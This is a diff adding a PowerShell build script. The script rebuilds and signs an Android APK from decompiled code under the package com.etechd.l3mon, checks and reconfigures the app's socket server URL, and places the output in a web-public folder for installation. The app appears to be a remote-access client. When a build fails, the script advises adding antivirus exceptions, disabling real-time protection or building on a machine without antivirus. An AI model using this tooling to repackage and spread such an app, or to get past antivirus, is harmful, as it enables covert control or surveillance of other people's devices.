@@ -1,0 +1,99 @@
+# Скрипт проверки и пересборки APK
+
+Write-Host "=== APK Build Checker ===" -ForegroundColor Cyan
+
+# Проверка Java
+Write-Host "`n[1/4] Checking Java..." -ForegroundColor Yellow
+$javaVersion = java -version 2>&1 | Select-String -Pattern "version"
+if ($LASTEXITCODE -ne 0) {
+    Write-Host "ERROR: Java not found!" -ForegroundColor Red
+    exit 1
+}
+Write-Host "Java found: $javaVersion" -ForegroundColor Green
+
+# Проверка файлов
+Write-Host "`n[2/4] Checking build tools..." -ForegroundColor Yellow
+if (-not (Test-Path "apktool.jar")) {
+    Write-Host "ERROR: apktool.jar not found!" -ForegroundColor Red
+    exit 1
+}
+if (-not (Test-Path "sign.jar")) {
+    Write-Host "ERROR: sign.jar not found!" -ForegroundColor Red
+    exit 1}
+Write-Host "Build tools found" -ForegroundColor Green
+
+# Проверка существующего APK
+Write-Host "`n[3/4] Checking existing APK..." -ForegroundColor Yellow
+$apkPath = "..\..\assets\webpublic\build.apk"
+if (Test-Path $apkPath) {
+    $apkSize = (Get-Item $apkPath).Length / 1MB
+    Write-Host "Existing APK size: $([math]::Round($apkSize, 2)) MB" -ForegroundColor Gray
+    if ($apkSize -lt 1) {
+        Write-Host "WARNING: APK seems too small, will rebuild" -ForegroundColor Yellow
+        Remove-Item $apkPath -Force
+    } else {
+        $rebuild = Read-Host "APK exists. Rebuild anyway? (y/n)"
+        if ($rebuild -ne "y") {
+            Write-Host "Skipping rebuild" -ForegroundColor Gray
+            exit 0
+        }
+    }
+}
+
+# Проверка URL сервера
+Write-Host "`n[3.5/4] Checking server URL configuration..." -ForegroundColor Yellow
+$iosocketFile = "decompiled\smali\com\etechd\l3mon\IOSocket.smali"
+if (Test-Path $iosocketFile) {
+    $content = Get-Content $iosocketFile -Raw
+    if ($content -match 'android-manage\.localzet\.ru') {
+        Write-Host "WARNING: Server URL is still set to default!" -ForegroundColor Yellow
+        Write-Host "Run: .\configure-server-url.ps1 -AutoDetect" -ForegroundColor White
+        $configure = Read-Host "Configure URL now? (y/n)"
+        if ($configure -eq "y") {
+            & "$PSScriptRoot\configure-server-url.ps1" -AutoDetect
+        }
+    } else {
+        Write-Host "Server URL configured ✅" -ForegroundColor Green
+    }
+}
+
+# Пересборка
+Write-Host "`n[4/4] Building APK..." -ForegroundColor Yellow
+Write-Host "NOTE: Antivirus may block classes.dex creation." -ForegroundColor Yellow
+Write-Host "If build fails, add exception for: $PWD" -ForegroundColor Yellow
+Write-Host ""
+
+$buildCmd = "java -jar `"apktool.jar`" b `"decompiled`" -o `"$apkPath`""
+Invoke-Expression $buildCmd
+
+if ($LASTEXITCODE -eq 0) {
+    Write-Host "`nBuild successful! Signing APK..." -ForegroundColor Green
+    
+    # Используем альтернативный метод подписи (совместим с Java 17)
+    & "$PSScriptRoot\sign-apk.ps1" -ApkPath $apkPath
+    
+    if ($LASTEXITCODE -eq 0) {
+        $finalSize = (Get-Item $apkPath).Length / 1MB
+        Write-Host "`nSUCCESS! APK built and signed." -ForegroundColor Green
+        Write-Host "Location: $apkPath" -ForegroundColor Cyan
+        Write-Host "Size: $([math]::Round($finalSize, 2)) MB" -ForegroundColor Cyan
+        Write-Host "`nNext steps:" -ForegroundColor Yellow
+        Write-Host "  1. Run: .\test-device.ps1" -ForegroundColor White
+        Write-Host "  2. Or manually: adb install -r $apkPath" -ForegroundColor White
+    } else {
+        Write-Host "ERROR: Signing failed!" -ForegroundColor Red
+        Write-Host "`nTrying manual signing..." -ForegroundColor Yellow
+        Write-Host "You can try:" -ForegroundColor Yellow
+        Write-Host "  1. Install Android SDK Build Tools" -ForegroundColor White
+        Write-Host "  2. Or use: .\sign-apk.ps1 -ApkPath `"$apkPath`"" -ForegroundColor White
+        exit 1
+    }
+} else {
+    Write-Host "`nERROR: Build failed!" -ForegroundColor Red
+    Write-Host "`nPossible solutions:" -ForegroundColor Yellow
+    Write-Host "  1. Add antivirus exception for: $PWD" -ForegroundColor White
+    Write-Host "  2. Temporarily disable real-time protection" -ForegroundColor White
+    Write-Host "  3. Build on VM without antivirus" -ForegroundColor White
+    exit 1
+}
+
